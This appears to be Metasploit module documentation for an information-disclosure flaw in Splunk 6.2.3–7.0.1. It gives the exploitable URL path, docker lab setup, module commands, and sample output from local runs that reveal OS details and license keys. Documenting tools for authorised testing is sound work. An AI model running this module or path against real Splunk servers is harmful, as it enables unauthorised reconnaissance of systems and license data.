## Vulnerable Application

Splunk versions 6.2.3 through 7.0.1 allows information disclosure by appending
`/__raw/services/server/info/server-info?output_mode=json` to a query.

Versisons 6.6.0 through 7.0.1 require authentication.

### Docker Install

#### Splunk 6.5.5

A vulnerable version of Splunk can be installed locally with docker:

`docker run -p 8000:8000 -e "SPLUNK_PASSWORD=splunk" -e "SPLUNK_START_ARGS=--accept-license" -it --name so1 splunk/splunk:6.5.5`

#### Splunk 7.1.0

At startup it'll ask for a password for the system. You may need to login via the website and accept a license and restart
the service (via website) for the instance to be exploitable. Splunk can be started via docker with:

`docker run -p 8000:8000 -e "SPLUNK_START_ARGS=--accept-license" -it --name so2 splunk/splunk:7.1.0`

## Verification Steps

1. Install the application
1. Start msfconsole
1. Do: `use auxiliary/gather/splunk_raw_server_info`
1. Do: `SET RHOSTS [IP]`
1. You should receive output about the Splunk version and roles, license status, including license key info, and OS information.

## Options

## Scenarios

### Splunk 6.5.5

```
msf6 > use auxiliary/gather/splunk_raw_server_info 
msf6 auxiliary(gather/splunk_raw_server_info) > exploit
[*] Running module against 127.0.0.1

[+] Output saved to ~/.msf4/loot/20231220130955_default_127.0.0.1_splunk.system.st_442957.bin
[+] Hostname: 3c7b9beb6c3c
[+] CPU Architecture: x86_64
[+] Operating System: Linux
[+] OS Build: #1 SMP PREEMPT_DYNAMIC Debian 6.5.3-1kali2 (2023-10-03)
[+] OS Version: 6.5.0-kali2-amd64
[+] Splunk Version: 6.5.5
[+] Trial Version?: true
[+] Splunk Forwarder?: false
[+] Splunk Product Type: enterprise
[+] License State: EXPIRED
[+] License Key(s): []
[+] Splunk Server Roles: ["indexer", "license_master"]
[+] Splunk Server Startup Time: 2023-12-19 20:56:13
```

### Splunk 7.1.0

```
[msf](Jobs:0 Agents:0) > use auxiliary/gather/splunk_raw_server_info 
[msf](Jobs:0 Agents:0) auxiliary(gather/splunk_raw_server_info) > set rhosts 127.0.0.1
rhosts => 127.0.0.1
[msf](Jobs:0 Agents:0) auxiliary(gather/splunk_raw_server_info) > set username admin
username => admin
[msf](Jobs:0 Agents:0) auxiliary(gather/splunk_raw_server_info) > set password splunksplunk
password => splunksplunk
[msf](Jobs:0 Agents:0) auxiliary(gather/splunk_raw_server_info) > set verbose true
verbose => true
[msf](Jobs:0 Agents:0) auxiliary(gather/splunk_raw_server_info) > run
[*] Running module against 127.0.0.1

[+] Output saved to /root/.msf4/loot/20231220204049_default_127.0.0.1_splunk.system.st_943292.json
[+] Hostname: 523a845e8652
[+] CPU Architecture: x86_64
[+] Operating System: Linux
[+] OS Build: #1 SMP PREEMPT_DYNAMIC Debian 6.5.6-1kali1 (2023-10-09)
[+] OS Version: 6.5.0-kali3-amd64
[+] Splunk Version: 7.1.0
[+] Trial Version?: false
[+] Splunk Forwarder?: false
[+] Splunk Product Type: splunk
[+] License State: OK
[+] License Key(s): ["FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"]
[+] Splunk Server Roles: ["indexer", "license_master"]
[+] Splunk Server Startup Time: 2023-12-21 01:40:02
[*] Auxiliary module execution completed
```
